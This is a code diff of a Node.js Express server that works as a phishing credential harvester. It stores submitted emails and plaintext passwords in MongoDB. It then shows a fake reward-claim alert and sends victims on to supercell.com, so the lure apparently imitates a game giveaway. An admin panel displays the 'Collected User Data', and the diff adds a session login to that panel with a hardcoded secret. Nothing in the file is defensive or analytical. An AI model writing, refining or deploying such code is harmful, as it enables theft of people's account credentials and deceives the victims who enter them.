@@ -1,66 +1,92 @@
-const express = require("express");
-const mongoose = require("mongoose");
-const bodyParser = require("body-parser");
-const path = require("path");
-require("dotenv").config();
+const express = require('express');
+const bodyParser = require('body-parser');
+const mongoose = require('mongoose');
+const path = require('path');
+const session = require('express-session');
+require('dotenv').config();
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, "public")));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true }));
 
-const safeUri = process.env.MONGODB_URI.replace(/:\/\/.*:.*@/, "://****:****@");
-console.log("Connecting to MongoDB at:", safeUri);
+// MongoDB connect
+mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
+.then(() => console.log("MongoDB Connected"))
+.catch(err => console.error("MongoDB connection error:", err));
 
-mongoose.connect(process.env.MONGODB_URI)
-  .then(() => console.log("MongoDB connected"))
-  .catch(err => {
-    console.error("MongoDB connection error:", err.message);
-    process.exit(1);
-  });
-
-const UserSchema = new mongoose.Schema({
-  email: String,
-  password: String,
-  date: { type: Date, default: Date.now }
+// User schema
+const userSchema = new mongoose.Schema({
+    email: String,
+    password: String
 });
-const User = mongoose.model("User", UserSchema);
+const User = mongoose.model('User', userSchema);
 
-// Save user details
-app.post("/submit", async (req, res) => {
-  try {
+// Handle login form submissions
+app.post('/login', async (req, res) => {
     const { email, password } = req.body;
-    if (email && password) {
-      await new User({ email, password }).save();
-      res.redirect("https://supercell.com");
-    } else {
-      res.status(400).send("Missing email or password");
-    }
-  } catch (err) {
-    console.error("Error saving user:", err.message);
-    res.status(500).send("Error saving data");
-  }
+    await User.create({ email, password });
+    res.send(`<script>alert('Thank you for your details. Your reward will be claimed within 24 hours.'); window.location.href='https://supercell.com';</script>`);
 });
 
-// Open admin panel
-app.get("/admin", async (req, res) => {
-  try {
-    const users = await User.find().sort({ date: -1 });
-    let table = `<div style="overflow-x:auto;"><table border="1" style="width:100%;border-collapse:collapse;">
-      <thead><tr style="background:#f2f2f2;"><th>Email</th><th>Password</th><th>Date</th></tr></thead><tbody>`;
-    users.forEach(u => table += `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`);
-    table += "</tbody></table></div>";
-    res.send(`<html><head><title>Admin</title>
-      <style>
-        body{font-family:sans-serif;padding:10px;background:#fff;}
-        table{max-width:100%;font-size:16px;}
-        th,td{padding:10px;text-align:left;border:1px solid #ccc;}
-        tr:nth-child(even){background:#f9f9f9;}
-      </style></head>
-      <body><h2>Collected Data:</h2>${table}</body></html>`);
-  } catch (err) {
-    console.error("Error fetching users:", err.message);
-    res.status(500).send("Error loading admin data");
-  }
+// Admin login middleware
+function requireLogin(req, res, next) {
+    if (req.session.loggedIn) next();
+    else res.redirect('/admin-login');
+}
+
+// Admin login form
+app.get('/admin-login', (req, res) => {
+    res.send(`
+        <form method="POST" action="/admin-login" style="max-width:400px;margin:auto;padding:20px;">
+            <h2>Admin Login</h2>
+            <input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;" />
+            <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;" />
+            <button type="submit" style="width:100%;padding:10px;">Login</button>
+            ${req.query.error ? "<p style='color:red;'>Invalid credentials</p>" : ""}
+        </form>
+    `);
+});
+
+app.post('/admin-login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
+        req.session.loggedIn = true;
+        res.redirect('/admin');
+    } else {
+        res.redirect('/admin-login?error=1');
+    }
+});
+
+// Admin panel
+app.get('/admin', requireLogin, async (req, res) => {
+    const users = await User.find();
+    let rows = users.map(u => `<tr><td>${u.email}</td><td>${u.password}</td></tr>`).join('');
+    res.send(`
+        <html>
+        <head>
+            <title>Admin Panel</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                body { font-family: Arial; padding: 20px; background: #f4f4f4; }
+                table { width: 100%; border-collapse: collapse; background: white; }
+                th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+                th { background: #333; color: white; }
+                tr:nth-child(even) { background: #f9f9f9; }
+                .container { max-width: 100%; overflow-x: auto; }
+            </style>
+        </head>
+        <body>
+            <h2>Collected User Data</h2>
+            <div class="container">
+                <table>
+                    <tr><th>Email</th><th>Password</th></tr>
+                    ${rows}
+                </table>
+            </div>
+        </body>
+        </html>
+    `);
 });
 
 const PORT = process.env.PORT || 3000;
